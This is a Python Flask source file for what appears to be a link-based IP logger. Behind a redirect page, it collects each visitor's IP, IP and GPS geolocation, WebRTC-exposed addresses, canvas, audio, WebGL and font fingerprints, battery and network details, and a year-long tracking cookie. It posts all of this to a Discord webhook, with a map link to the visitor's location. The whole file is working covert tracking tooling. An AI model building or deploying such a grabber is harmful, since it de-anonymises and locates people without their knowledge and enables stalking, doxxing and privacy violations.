import os # OS library is used for inrecting with operatyng system, file paths and etc
import json # for parsing and generating JSON data
import time # time library is used for measuring response time and timestamps
import threading # for running tasks in parallel threads
import uuid # used to generate unique vivitor ID
from datetime import datetime, timezone # for working with date and time, including UTC timezone
import requests # for making HTTP requests to external services (like Discord webhook)
from flask import Flask, request, make_response, render_template
from dotenv import load_dotenv

"""
os.path.dirname(__file__) gets the directory of the current file (app.p)
os.path.join puts .env file inside the same directory ass app.py
load_dotenv loads the environment variables from the .env file into the application
"""
load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))

app = Flask(__name__)

""" Load configuration from environment variables """
DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
ADMIN_USER = os.getenv("ADMIN_USER")
ADMIN_PASS = os.getenv("ADMIN_PASS")
REDIRECT_URL = os.getenv("REDIRECT_URL")


""" Discord """
def _send_to_discord(payload): # this function recieves python dictionary containing the message that must be sent to discord.
    if not DISCORD_WEBHOOK_URL:
        return

    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        if response.status_code not in (200, 204): #Discord normally responds with HTTP status code 200 or 204 for successfull requests.
            print("Discord webhook error:", response.status_code,
                  response.text[:1000])

    except requests.RequestException as e:
        print("Discord request error:", e)


""" Format WebRTC data for Discord embed"""
def format_webrtc(webrtc):
    if not isinstance(webrtc, dict): #checks whethere webrtc is a dictionary 
        return "WebRTC data unavailable"

    if not webrtc.get("supported"):
        return "WebRTC not supported"

    """
    Candidates" are potential network paths (IP addresses and ports) that a browser can use to connect to another peer. 
    If the list is empty, it means the browser successfully blocked or masked its identity, so there is nothing to format.
    """
    candidates = webrtc.get("candidates", [])# gets candidates from the list, if it doesnt exist [] set by default

    if not candidates:
        return "No ICE candidates exposed"

    lines = []

    for i, candidate in enumerate(candidates, 1):
        candidate_type = candidate.get("type") or "unknown"
        protocol = candidate.get("protocol") or "unknown"
        address = candidate.get("address") or "hidden"
        port = candidate.get("port") or "unknown"

        if candidate_type == "host":
            icon = "🏠"
            description = "Local network candidate"
        elif candidate_type == "srflx":
            icon = "🌍"
            description = "Public/NAT candidate"
        elif candidate_type == "relay":
            icon = "🔄"
            description = "TURN relay candidate"
        else:
            icon = "❓"
            description = "Unknown candidate"

        lines.append(f"{icon} **Candidate {i}**\n"
                     f"Type: `{candidate_type}` — {description}\n"
                     f"Address: `{address}`\n"
                     f"Protocol: `{protocol}`\n"
                     f"Port: `{port}`")

    return "\n\n".join(lines)[:1024] #It glues all the individual candidate blocks stored in the lines list together, separating them with two newlines (\n\n) for clean paragraph breaks.[:1024] utilizes Python string slicing to strictly chop the final string at 1,024 characters.

""" Format font detection data for Discord embed """
def format_fonts(fonts):
    if not isinstance(fonts, dict): 
        return "Font detection unavailable"

    detected = fonts.get("detectedFonts", [])
    count = fonts.get("count", len(detected))

    if not detected:
        return "No tested fonts detected"

    # Discord embed field limit
    max_fonts = 35
    displayed = detected[:max_fonts]

    lines = [f"**Detected:** `{count}` fonts", ""]

    for font in displayed:
        lines.append(f"• `{font}`")

    if len(detected) > max_fonts:
        lines.append(f"\n*…and {len(detected) - max_fonts} more*")

    return "\n".join(lines)[:1024]


# Formats browser's geolocation API reuslt
def format_location(location):
    if not isinstance(location, dict):
        return "Location unavailable"

    if not location.get("supported"):
        return "Geolocation not supported"

    if not location.get("granted"):
        reason = location.get("reason") or "Permission denied"
        return f"Permission not granted\n`{reason}`"

    latitude = location.get("latitude")
    longitude = location.get("longitude")
    accuracy = location.get("accuracyMeters")

    if latitude is None or longitude is None:
        return "Coordinates unavailable"

    accuracy_text = (f"{round(float(accuracy), 1)} m"
                     if accuracy is not None else "unknown")

    return (f"📍 **Latitude:** `{latitude}`\n"
            f"📍 **Longitude:** `{longitude}`\n"
            f"🎯 **Accuracy:** `{accuracy_text}`\n\n"
            f"[🗺️ Open in Google Maps]"
            f"(https://www.google.com/maps?q={latitude},{longitude})")[:1024]


# Sends the collected data to Discord webhook
def notify_discord(data):
    if not DISCORD_WEBHOOK_URL:
        return

    # Battery information API
    battery = data.get("battery") or {}
    battery_text = "Unavaliable"

    if battery.get("supported"):
        level = battery.get("level")
        charging = battery.get("charging")

        status = "⚡ Charging" if charging else "🔋 Discharging"

        battery_text = (
            f"**Level:** `{level}%`\n"
            f"**Status:** {status}\n"
            f"**Charging time:** `{battery.get('chargingTime', 'N/A')}s`\n"
            f"**Discharging time:** `{battery.get('dischargingTime', 'N/A')}s`"
        )

    # Network information API
    network = data.get("network") or {}
    network_text = "Unavailable"

    if network.get("supported"):
        effective_type = network.get("effectiveType") or "Unknown"
        connection_type = network.get("type") or "Not reported"
        downlink = network.get("downlink")
        rtt = network.get("rtt")
        save_data = network.get("saveData")

        network_text = (f"**Connection:** `{effective_type.upper()}`\n"
                        f"**Type:** `{connection_type}`\n"
                        f"**Download:** `{downlink} Mbps`\n"
                        f"**Latency:** `{rtt} ms`\n"
                        f"**Data Saver:** `{'On' if save_data else 'Off'}`")

    # Helper function to clean and limit string values
    def clean(value, limit=100):
        if value is None:
            return "unknown"

        value = str(value)

        if not value:
            return "unknown"

        return value[:limit]

    # Prepare Discord embed fields
    fields = [
        {
            "name":
            "🌐 IP & 📍 Location",
            "value": (f"**IP:** `{clean(data.get('ip'))}`\n\n"
                      f"{format_location(data.get('location'))}")[:1024],
            "inline": False,
        },
        {
            "name": "Country",
            "value": clean(data.get("country")),
            "inline": True,
        },
        {
            "name": "City",
            "value": clean(data.get("city")),
            "inline": True,
        },
        {
            "name": "ISP",
            "value": clean(data.get("isp")),
            "inline": True,
        },
        {
            "name": "ASN", #An Autonomous System Number (ASN) is a unique identification number assigned to a large block of IP addresses managed by a single network operator
            "value": clean(data.get("asn")),
            "inline": True,
        },
        {
            "name": "Browser",
            "value": clean(data.get("browser")),
            "inline": True,
        },
        {
            "name": "OS",
            "value": clean(data.get("os")),
            "inline": True,
        },
        {
            "name": "Device",
            "value": clean(data.get("device")),
            "inline": True,
        },
        {
            "name": "Language",
            "value": clean(data.get("language")),
            "inline": True,
        },
        {
            "name": "Timezone",
            "value": clean(data.get("timezone")),
            "inline": True,
        },
        {
            "name": "Screen",
            "value": clean(data.get("screen")),
            "inline": True,
        },
        {
            "name": "Referrer",
            "value": clean(data.get("referer")),
            "inline": False,
        },
        {
            "name": "Path",
            "value": clean(data.get("path")),
            "inline": True,
        },
        {
            "name": "Method",
            "value": clean(data.get("method")),
            "inline": True,
        },
        {
            "name": "User-Agent",
            "value": clean(data.get("user_agent")),
            "inline": False,
        },
        {
            "name": "Canvas Fingerprint", # fingerprint
            "value": clean(data.get("canvasFingerprint")),
            "inline": False,
        },
        {
            "name": "Audio Fingerprint", # fingerprint
            "value": clean(data.get("audioFingerprint")),
            "inline": False,
        },
        {
            "name": "Font Detection", # fingerprint
            "value": format_fonts(data.get("fonts")),
            "inline": False,
        },
        {
            "name": "WebGL Vendor", # fingerprint
            "value": clean(data.get("webglVendor")),
            "inline": True,
        },
        {
            "name": "WebGL Renderer", # fingerprint
            "value": clean(data.get("webglRenderer")),
            "inline": True,
        },
        {
            "name": "🌐 WebRTC Network",
            "value": format_webrtc(data.get("webrtc")),
            "inline": False,
        },
        {
            "name": "Visitor ID",
            "value": clean(data.get("visitor_id")),
            "inline": False,
        },
        {
            "name": "Returning Visitor",
            "value": clean(data.get("returning_visitor")),
            "inline": True,
        },
        {
            "name": "🔋 Battery",
            "value": battery_text,
            "inline": False,
        },
        {
            "name": "📶 Network",
            "value": network_text,
            "inline": False,
        },
    ]
    payload = {
        "embeds": [{
            "title": "New Visitor",
            "color": 5814783,
            "fields": fields,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }]
    }
    threading.Thread(
        target=_send_to_discord, 
        args=(payload, ),
        daemon=True
    ).start()


# Ip of User
def get_client_ip():
    for header in ("CF-Connecting-IP", "True-Client-IP"):
        value = request.headers.get(header)
        if value:
            return value.strip()
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr


# HTTP information
def collect_http_data():
    headers = {}

    for key, value in request.headers.items():
        headers[key] = value

    return {
        "ip":
        get_client_ip(),
        "timestamp":
        datetime.now(timezone.utc).isoformat(),
        "method":
        request.method,
        "path":
        request.path,
        "query_string":
        request.query_string.decode("utf-8", errors="replace")[:5000],
        "full_url":
        request.url[:5000],
        "host":
        request.host,
        "scheme":
        request.scheme,
        "protocol":
        request.environ.get("SERVER_PROTOCOL"),
        "referer":
        request.headers.get("Referer", "")[:2000],
        "user_agent":
        request.headers.get("User-Agent", "")[:2000],
        "accept":
        request.headers.get("Accept", "")[:1000],
        "accept_language":
        request.headers.get("Accept-Language", "")[:1000],
        "accept_encoding":
        request.headers.get("Accept-Encoding", "")[:1000],
        "content_type":
        request.headers.get("Content-Type", "")[:1000],
        "content_length":
        request.content_length,
        "headers":
        headers,
    }


def detect_browser(user_agent):
    ua = user_agent.lower()
    if "edg/" in ua:
        return "Microsoft Edge"
    if "opr/" in ua or "opera" in ua:
        return "Opera"
    if "chrome/" in ua and "chromium" not in ua:
        return "Google Chrome"
    if "firefox/" in ua:
        return "Mozilla Firefox"
    if "safari/" in ua and "chrome/" not in ua:
        return "Safari"
    if "chromium" in ua:
        return "Chromium"
    return "Unknown"


def detect_os(user_agent):
    ua = user_agent.lower()
    if "windows" in ua:
        return "Windows"
    if "android" in ua:
        return "Android"
    if "iphone" in ua or "ipad" in ua or "ios" in ua:
        return "iOS"
    if "mac os x" in ua:
        return "macOS"
    if "linux" in ua:
        return "Linux"
    if "cros" in ua:
        return "ChromeOS"
    return "Unknown"


def detect_device(user_agent):
    ua = user_agent.lower()
    if "ipad" in ua:
        return "Tablet"
    if "tablet" in ua:
        return "Tablet"
    if ("mobile" in ua or "iphone" in ua or "android" in ua):
        return "Mobile"
    return "Desktop"


# Ip geolocation
def get_ip_information(ip):
    if not ip:
        return {}
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={
                "fields": ("status,message,country,countryCode,"
                           "region,regionName,city,zip,lat,lon,"
                           "timezone,isp,org,as,reverse,proxy,hosting")
            },
            timeout=4)
        if response.status_code != 200:
            return {}
        data = response.json()
        if data.get("status") != "success":
            return {}
        return {
            "country": data.get("country"),
            "country_code": data.get("countryCode"),
            "region": data.get("regionName"),
            "city": data.get("city"),
            "postal_code": data.get("zip"),
            "latitude": data.get("lat"),
            "longitude": data.get("lon"),
            "timezone": data.get("timezone"),
            "isp": data.get("isp"),
            "organization": data.get("org"),
            "asn": data.get("as"),
            "reverse_dns": data.get("reverse"),
            "proxy": data.get("proxy"),
            "hosting": data.get("hosting"),
        }
    except (requests.RequestException, ValueError):
        return {}


# Visitor ID management
def get_or_create_visitor_id():
    visitor_id = request.cookies.get("visitor_id")

    if visitor_id:
        return visitor_id, True

    return str(uuid.uuid4()), False


# Main route
@app.route("/")
def index():
    start = time.perf_counter() # timer to understand how much time is needed to process user's data

    data = collect_http_data()

    user_agent = data.get("user_agent", "")

    data["browser"] = detect_browser(user_agent)
    data["os"] = detect_os(user_agent)
    data["device"] = detect_device(user_agent)

    geo = get_ip_information(data.get("ip"))
    data.update(geo)

    data["response_time_ms"] = round((time.perf_counter() - start) * 1000, 2) # time stops and rounds millieseconds

    visitor_id, is_new = get_or_create_visitor_id() # unique visitor identifier 

    data["visitor_id"] = visitor_id
    data["returning_visitor"] = not is_new

    rendered_page = render_template('index.html', redirect_url=REDIRECT_URL)

    response = make_response(rendered_page, 200)

    # First-party persistent visitor identifier.
    if is_new:
        response.set_cookie("visitor_id",
                            visitor_id,
                            max_age=60 * 60 * 24 * 365,
                            httponly=True,
                            secure=True,
                            samesite="Lax")

    return response


# data collection(telemetry) route. 
@app.route("/collect", methods=["POST"])
def collect():

    try:
        browser_data = request.get_json(silent=True) or {}

        server_data = collect_http_data()

        visitor_id = request.cookies.get("visitor_id")

        browser_data["visitor_id"] = visitor_id
        browser_data["returning_visitor"] = visitor_id is not None

        user_agent = server_data.get("user_agent", "")

        # Server-side information
        browser_data["ip"] = get_client_ip()

        browser_data["browser"] = detect_browser(user_agent)

        browser_data["os"] = detect_os(user_agent)

        browser_data["device"] = detect_device(user_agent)

        # WebGL data for Discord
        webgl = browser_data.get("webgl")

        if isinstance(webgl, dict):
            browser_data["webglVendor"] = webgl.get("vendor")

            browser_data["webglRenderer"] = webgl.get("renderer")

        browser_data["server_timestamp"] = (datetime.now(
            timezone.utc).isoformat())

        # Add IP geolocation
        geo = get_ip_information(browser_data["ip"])

        browser_data.update(geo)

        # Add useful HTTP information
        browser_data["method"] = request.method
        browser_data["path"] = request.path
        browser_data["referer"] = server_data.get("referer", "")
        browser_data["user_agent"] = user_agent

        # Send the combined information to Discord
        notify_discord(browser_data)

        # Do not accept arbitrary huge values
        safe_browser_data = {
            str(k)[:100]: str(v)[:5000]
            for k, v in browser_data.items()
        }

        print("\n========== BROWSER TELEMETRY ==========")

        print(json.dumps(safe_browser_data, indent=2, ensure_ascii=False))

        print("========================================\n")

        return {"status": "ok"}, 200

    except Exception as e:

        print("Telemetry error:", str(e))

        return {"status": "error"}, 400


# run the app
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)